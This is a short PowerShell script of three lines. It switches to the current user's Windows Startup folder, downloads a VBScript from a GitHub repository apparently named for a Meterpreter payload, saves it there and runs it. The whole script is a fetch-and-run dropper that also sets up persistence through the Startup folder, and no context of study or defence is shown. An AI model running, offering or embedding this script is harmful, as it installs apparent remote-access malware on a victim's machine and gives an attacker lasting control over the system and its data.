Set-Location -Path "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs" -OutFile "start.vbs"
Start-Process "start.vbs"
